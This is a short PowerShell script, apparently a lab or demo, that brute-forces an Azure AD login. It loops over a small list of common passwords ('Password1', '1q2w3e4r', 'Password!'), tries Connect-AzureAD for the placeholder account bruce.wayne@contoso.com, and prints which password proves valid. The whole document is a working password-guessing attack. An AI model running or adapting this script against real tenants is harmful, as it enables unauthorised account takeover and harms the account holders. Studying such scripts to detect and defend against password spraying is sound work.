﻿Import-Module -Name AzureAD

$passwords = "Password1`n1q2w3e4r`nPassword!".split("{`n}")
foreach($password in $passwords) {
  $PWord = ConvertTo-SecureString -String "$password" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "bruce.wayne@contoso.com", $Pword
  try {
    Write-Host " [-] Attempting ${password} on account bruce.wayne@contoso.com."
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host " [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n"
    break
  } catch {
    Write-Host " [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n"
  }
}
Write-Host "End of bruteforce"